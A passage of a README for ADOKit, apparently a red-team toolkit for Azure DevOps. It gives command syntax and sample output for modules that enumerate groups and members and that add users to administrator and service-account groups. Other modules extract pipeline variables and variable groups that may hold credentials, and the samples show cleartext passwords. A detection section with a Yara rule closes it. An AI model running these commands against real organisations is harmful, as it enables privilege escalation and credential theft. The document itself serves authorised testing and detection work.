    [YourOrganization]\Project-Scoped Users |                               Project-Scoped Users | Members of this group will have limited visibility to  organization-level data
   [ProjectWithMultipleRepos]\Build Administrators |                               Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
                            [MaraudersMap]\Readers |                                            Readers | Members of this group have access to the team project.
[YourOrganization]\Project Collection Test Service Accounts |           Project Collection Test Service Accounts | Members of this group should include the service accounts used by the test controllers set up for this project collection.
                  [MaraudersMap]\MaraudersMap Team |                                  MaraudersMap Team |                          The default project team.
     [TEAM FOUNDATION]\Enterprise Service Accounts |                        Enterprise Service Accounts | Members of this group have service-level permissions in this enterprise. For service accounts only.
  [YourOrganization]\Security Service Group |                             Security Service Group | Identities which are granted explicit permission to a resource will be automatically added to this group if they were not previously a member of any other group.
              [TestProject]\Release Administrators |                             Release Administrators | Members of this group can perform all operations on Release Management


---SNIP---

4/3/23 20:48:46 Finished execution of listgroup

```

### Search Groups

#### Use Case

> *Search for given group(s) in Azure DevOps instance*

#### Syntax

Provide the `searchgroup` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the user principal name, display name and description for the matching group.

`ADOKit.exe searchgroup /credential:apiKey /url:https://dev.azure.com/organizationName /search:"someGroup"`

`ADOKit.exe searchgroup /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:"someGroup"`

#### Example Output

```
C:\>ADOKit.exe searchgroup /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:"admin"

==================================================
Module:         searchgroup
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 4:48:41 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                                                   UPN |                   Display Name |                                        Description
------------------------------------------------------------------------------------------------------------------------------------------------------------
                                   [TestProject2]\Build Administrators |           Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
                       [ProjectWithMultipleRepos]\Build Administrators |           Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
                                  [TestProject]\Release Administrators |         Release Administrators | Members of this group can perform all operations on Release Management
                                    [TestProject]\Build Administrators |           Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
                                 [MaraudersMap]\Project Administrators |         Project Administrators | Members of this group can perform all operations in the team project.
                                 [TestProject2]\Project Administrators |         Project Administrators | Members of this group can perform all operations in the team project.
           [YourOrganization]\Project Collection Administrators | Project Collection Administrators | Members of this application group can perform all privileged operations on the Team Project Collection.
                     [ProjectWithMultipleRepos]\Project Administrators |         Project Administrators | Members of this group can perform all operations in the team project.
                                   [MaraudersMap]\Build Administrators |           Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
     [YourOrganization]\Project Collection Build Administrators | Project Collection Build Administrators | Members of this group should include accounts for people who should be able to administer the build resources.
                                  [TestProject]\Project Administrators |         Project Administrators | Members of this group can perform all operations in the team project.

4/3/23 20:48:42 Finished execution of searchgroup

```

### Get Group Members

#### Use Case

> *List all group members for a given group*

#### Syntax

Provide the `getgroupmembers` module and the group(s) you would like to search for in the `/group:` command-line argument, along with any relevant authentication information and URL. This will output the user principal name of the group matching, along with each group member of that group including the user's mail address and display name.

`ADOKit.exe getgroupmembers /credential:apiKey /url:https://dev.azure.com/organizationName /group:"someGroup"`

`ADOKit.exe getgroupmembers /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /group:"someGroup"`

#### Example Output

```
C:\>ADOKit.exe getgroupmembers /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /group:"admin"

==================================================
Module:         getgroupmembers
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 9:11:03 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                   [TestProject2]\Build Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1
                                   [TestProject2]\Build Administrators |             user2@YourOrganization.onmicrosoft.com |                                             User 2
                                 [MaraudersMap]\Project Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins
                                 [MaraudersMap]\Project Administrators |           rsmith@YourOrganization.onmicrosoft.com |                                       Ron Smith
                                 [TestProject2]\Project Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1
                                 [TestProject2]\Project Administrators |             user2@YourOrganization.onmicrosoft.com |                                             User 2
           [YourOrganization]\Project Collection Administrators |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith
                     [ProjectWithMultipleRepos]\Project Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins
                                   [MaraudersMap]\Build Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins

4/4/23 13:11:09 Finished execution of getgroupmembers

```



### Get Project Permissions

#### Use Case

> *Get a listing of who has permissions to a given project.*

#### Syntax

Provide the `getpermissions` module and the project you would like to search for in the `/project:` command-line argument, along with any relevant authentication information and URL. This will output the user principal name, display name and description for the matching group. Additionally, this will output the group members for each of those groups.

`ADOKit.exe getpermissions /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someproject"`

`ADOKit.exe getpermissions /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someproject"`

#### Example Output

```
C:\>ADOKit.exe getpermissions /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap"

==================================================
Module:         getpermissions
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 9:11:16 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                               UPN |                                       Display Name |                                        Description
------------------------------------------------------------------------------------------------------------------------------------------------------------
               [MaraudersMap]\Build Administrators |                               Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
                       [MaraudersMap]\Contributors |                                       Contributors | Members of this group can add, modify, and delete items within the team project.
                  [MaraudersMap]\MaraudersMap Team |                                  MaraudersMap Team |                          The default project team.
             [MaraudersMap]\Project Administrators |                             Project Administrators | Members of this group can perform all operations in the team project.
                [MaraudersMap]\Project Valid Users |                                Project Valid Users | Members of this group have access to the team project.
                            [MaraudersMap]\Readers |                                            Readers | Members of this group have access to the team project.


[*] INFO: Listing group members for each group that has permissions to this project



GROUP NAME: [MaraudersMap]\Build Administrators

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


GROUP NAME: [MaraudersMap]\Contributors

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                           [MaraudersMap]\Contributors |             user1@YourOrganization.onmicrosoft.com |                                             User 1
                                           [MaraudersMap]\Contributors |             user2@YourOrganization.onmicrosoft.com |                                             User 2


GROUP NAME: [MaraudersMap]\MaraudersMap Team

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                      [MaraudersMap]\MaraudersMap Team | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins


GROUP NAME: [MaraudersMap]\Project Administrators

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                 [MaraudersMap]\Project Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins


GROUP NAME: [MaraudersMap]\Project Valid Users

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


GROUP NAME: [MaraudersMap]\Readers

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                [MaraudersMap]\Readers |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith

4/4/23 13:11:18 Finished execution of getpermissions

```

### Add Project Admin

#### Use Case

> *Add a user to the Project Administrators group for a given project.*

#### Syntax

Provide the `addprojectadmin` module along with a `/project:` and `/user:` for a given user to be added to the `Project Administrators` group for the given project. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addprojectadmin /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

`ADOKit.exe addprojectadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addprojectadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap" /user:"user1"

==================================================
Module:         addprojectadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 2:52:45 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Project Administrators group for the maraudersmap project.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                 [MaraudersMap]\Project Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins
                                 [MaraudersMap]\Project Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/4/23 18:52:47 Finished execution of addprojectadmin

```

### Remove Project Admin

#### Use Case

> *Remove a user from the Project Administrators group for a given project.*

#### Syntax

Provide the `removeprojectadmin` module along with a `/project:` and `/user:` for a given user to be removed from the `Project Administrators` group for the given project. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removeprojectadmin /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

`ADOKit.exe removeprojectadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removeprojectadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap" /user:"user1"

==================================================
Module:         removeprojectadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 3:19:43 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Project Administrators group for the maraudersmap project.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                 [MaraudersMap]\Project Administrators | brett.hawkins@YourOrganization.onmicrosoft.com |                                      Brett Hawkins

4/4/23 19:19:44 Finished execution of removeprojectadmin

```

### Add Build Admin

#### Use Case

> *Add a user to the Build Administrators group for a given project.*

#### Syntax

Provide the `addbuildadmin` module along with a `/project:` and `/user:` for a given user to be added to the `Build Administrators` group for the given project. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addbuildadmin /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

`ADOKit.exe addbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap" /user:"user1"

==================================================
Module:         addbuildadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 3:41:51 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Build Administrators group for the maraudersmap project.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                   [MaraudersMap]\Build Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/4/23 19:41:55 Finished execution of addbuildadmin

```

### Remove Build Admin

#### Use Case

> *Remove a user from the Build Administrators group for a given project.*

#### Syntax

Provide the `removebuildadmin` module along with a `/project:` and `/user:` for a given user to be removed from the `Build Administrators` group for the given project. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removebuildadmin /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

`ADOKit.exe removebuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject" /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removebuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap" /user:"user1"

==================================================
Module:         removebuildadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 3:42:10 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Build Administrators group for the maraudersmap project.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

4/4/23 19:42:11 Finished execution of removebuildadmin

```

### Add Collection Admin

#### Use Case

> *Add a user to the Project Collection Administrators group.*

#### Syntax

Provide the `addcollectionadmin` module along with a `/user:` for a given user to be added to the `Project Collection Administrators` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addcollectionadmin /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe addcollectionadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addcollectionadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         addcollectionadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 4:04:40 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Project Collection Administrators group.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
           [YourOrganization]\Project Collection Administrators |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith
           [YourOrganization]\Project Collection Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/4/23 20:04:43 Finished execution of addcollectionadmin

```

### Remove Collection Admin

#### Use Case

> *Remove a user from the Project Collection Administrators group.*

#### Syntax

Provide the `removecollectionadmin` module along with a `/user:` for a given user to be removed from the `Project Collection Administrators` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removecollectionadmin /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe removecollectionadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removecollectionadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         removecollectionadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 4:10:35 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Project Collection Administrators group.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
           [YourOrganization]\Project Collection Administrators |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith

4/4/23 20:10:38 Finished execution of removecollectionadmin

```

### Add Collection Build Admin

#### Use Case

> *Add a user to the Project Collection Build Administrators group.*

#### Syntax

Provide the `addcollectionbuildadmin` module along with a `/user:` for a given user to be added to the `Project Collection Build Administrators` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addcollectionbuildadmin /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe addcollectionbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addcollectionbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         addcollectionbuildadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 8:21:39 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Project Collection Build Administrators group.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     [YourOrganization]\Project Collection Build Administrators |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/5/23 12:21:42 Finished execution of addcollectionbuildadmin

```

### Remove Collection Build Admin

#### Use Case

> *Remove a user from the Project Collection Build Administrators group.*

#### Syntax

Provide the `removecollectionbuildadmin` module along with a `/user:` for a given user to be removed from the `Project Collection Build Administrators` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removecollectionbuildadmin /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe removecollectionbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removecollectionbuildadmin /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         removecollectionbuildadmin
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 8:21:59 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Project Collection Build Administrators group.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

4/5/23 12:22:02 Finished execution of removecollectionbuildadmin

```


### Add Collection Build Service Account

#### Use Case

> *Add a user to the Project Collection Build Service Accounts group.*

#### Syntax

Provide the `addcollectionbuildsvc` module along with a `/user:` for a given user to be added to the `Project Collection Build Service Accounts` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addcollectionbuildsvc /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe addcollectionbuildsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addcollectionbuildsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         addcollectionbuildsvc
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 8:22:13 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Project Collection Build Service Accounts group.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   [YourOrganization]\Project Collection Build Service Accounts |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/5/23 12:22:15 Finished execution of addcollectionbuildsvc

```

### Remove Collection Build Service Account

#### Use Case

> *Remove a user from the Project Collection Build Service Accounts group.*

#### Syntax

Provide the `removecollectionbuildsvc` module along with a `/user:` for a given user to be removed from the `Project Collection Build Service Accounts` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removecollectionbuildsvc /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe removecollectionbuildsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removecollectionbuildsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         removecollectionbuildsvc
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 8:22:27 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Project Collection Build Service Accounts group.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

4/5/23 12:22:28 Finished execution of removecollectionbuildsvc

```

### Add Collection Service Account

#### Use Case

> *Add a user to the Project Collection Service Accounts group.*

#### Syntax

Provide the `addcollectionsvc` module along with a `/user:` for a given user to be added to the `Project Collection Service Accounts` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe addcollectionsvc /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe addcollectionsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe addcollectionsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         addcollectionsvc
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 11:21:01 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to add user1 to the Project Collection Service Accounts group.

[+] SUCCESS: User successfully added

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
         [YourOrganization]\Project Collection Service Accounts |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith
         [YourOrganization]\Project Collection Service Accounts |             user1@YourOrganization.onmicrosoft.com |                                             User 1

4/5/23 15:21:04 Finished execution of addcollectionsvc

```

### Remove Collection Service Account

#### Use Case

> *Remove a user from the Project Collection Service Accounts group.*

#### Syntax

Provide the `removecollectionsvc` module along with a `/user:` for a given user to be removed from the `Project Collection Service Accounts` group. Additionally, provide along any relevant authentication information and URL. See [Module Details Table](#module-details-table) for the permissions needed to perform this action.

`ADOKit.exe removecollectionsvc /credential:apiKey /url:https://dev.azure.com/organizationName /user:"someUser"`

`ADOKit.exe removecollectionsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /user:"someUser"`

#### Example Output

```
C:\>ADOKit.exe removecollectionsvc /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /user:"user1"

==================================================
Module:         removecollectionsvc
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/5/2023 11:21:43 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Attempting to remove user1 from the Project Collection Service Accounts group.

[+] SUCCESS: User successfully removed

                                                                 Group |                                       Mail Address |                                       Display Name
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
         [YourOrganization]\Project Collection Service Accounts |          jsmith@YourOrganization.onmicrosoft.com |                                        John Smith

4/5/23 15:21:44 Finished execution of removecollectionsvc

```

### Get Pipeline Variables

#### Use Case

> *Extract any pipeline variables being used in project(s), which could contain credentials or other useful information.*

#### Syntax

Provide the `getpipelinevars` module along with a `/project:` for a given project to extract any pipeline variables being used. If you would like to extract pipeline variables from all projects specify `all` in the `/project:` argument.

`ADOKit.exe getpipelinevars /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getpipelinevars /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getpipelinevars /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`

`ADOKit.exe getpipelinevars /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all"`

#### Example Output

```
C:\>ADOKit.exe getpipelinevars /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap"

==================================================
Module:         getpipelinevars
Auth Type:      Cookie
Project:        maraudersmap
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/6/2023 12:08:35 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

             Pipeline Var Name |                                 Pipeline Var Value
-----------------------------------------------------------------------------------
                    credential |                                       P@ssw0rd123!
                           url |                                       http://blah/

4/6/23 16:08:36 Finished execution of getpipelinevars

```

### Get Pipeline Secrets

#### Use Case

> *Extract the names of any pipeline secrets being used in project(s), which will direct the operator where to attempt to perform secret extraction.*

#### Syntax

Provide the `getpipelinesecrets` module along with a `/project:` for a given project to extract the names of any pipeline secrets being used. If you would like to extract the names of pipeline secrets from all projects specify `all` in the `/project:` argument.

`ADOKit.exe getpipelinesecrets /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getpipelinesecrets /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getpipelinesecrets /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`

`ADOKit.exe getpipelinesecrets /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all"`

#### Example Output

```
C:\>ADOKit.exe getpipelinesecrets /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap"

==================================================
Module:         getpipelinesecrets
Auth Type:      Cookie
Project:        maraudersmap
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/10/2023 10:28:37 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

             Build Secret Name |   Build Secret Value
-----------------------------------------------------
             anotherSecretPass |             [HIDDEN]
                    secretpass |             [HIDDEN]

4/10/23 14:28:38 Finished execution of getpipelinesecrets

```

### Get Variable Groups

#### Use Case

> *Extract any variable group and the corresponding variables being used in project(s), which could contain credentials or other useful information.*

#### Syntax

Provide the `getvariablegroups` module along with a `/project:` for a given project to extract any variable groups being used. If you would like to extract variables groups from all projects specify `all` in the `/project:` argument.

`ADOKit.exe getvariablegroups /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getvariablegroups /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getvariablegroups /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`

`ADOKit.exe getvariablegroups /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all"`

#### Example Output

```
C:\>ADOKit.exe getvariablegroups /credential:"ABC123" /url:https://dev.azure.com/YourOrganization /project:"ADOKit"

==================================================
Module:         getvariablegroups
Auth Type:      Cookie
Project:        ADOKit
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      16/05/2024 16:53:31
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

           Variable Group Name |                  Variable Name |                                     Variable Value
--------------------------------------------------------------------------------------------------------------------
           real-test-variables |                  test_password |                                      BurpIsNotBeef
           real-test-variables |                      test_user |                                            nicolas
           fake-prod-variables |                    SUPERSECRET |                                           [HIDDEN]
           fake-prod-variables |                 SUPERNOTSECRET |                             ThisShouldBeSecured :/

```

### Get Service Connections

#### Use Case

> *List any service connections being used in project(s), which will direct the operator where to attempt to perform credential extraction for any service connections being used.*

#### Syntax

Provide the `getserviceconnections` module along with a `/project:` for a given project to list any service connections being used. If you would like to list service connections being used from all projects specify `all` in the `/project:` argument.

`ADOKit.exe getserviceconnections /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getserviceconnections /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject"`

`ADOKit.exe getserviceconnections /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`

`ADOKit.exe getserviceconnections /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all"`

#### Example Output

```
C:\>ADOKit.exe getserviceconnections /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization /project:"maraudersmap"

==================================================
Module:         getserviceconnections
Auth Type:      Cookie
Project:        maraudersmap
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/11/2023 8:34:16 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                             Connection Name |      Connection Type |                                                           ID
--------------------------------------------------------------------------------------------------------------------------------------------------
                                        Test Connection Name |              generic |                         195d960c-742b-4a22-a1f2-abd2c8c9b228
                                         Not Real Connection |              generic |                         cd74557e-2797-498f-9a13-6df692c22cac
  Azure subscription 1(47c5aaab-dbda-44ca-802e-00801de4db23) |              azurerm |                         5665ed5f-3575-4703-a94d-00681fdffb04
Azure subscription 1(1)(47c5aaab-dbda-44ca-802e-00801de4db23) |              azurerm |                         df8c023b-b5ad-4925-a53d-bb29f032c382

4/11/23 12:34:16 Finished execution of getserviceconnections

```

## Detection

Below are static signatures for the specific usage of this tool in its default state:

* Project GUID - `{60BC266D-1ED5-4AB5-B0DD-E1001C3B1498}`
  * See [ADOKit Yara Rule](Detections/ADOKit.yar) in this repo.
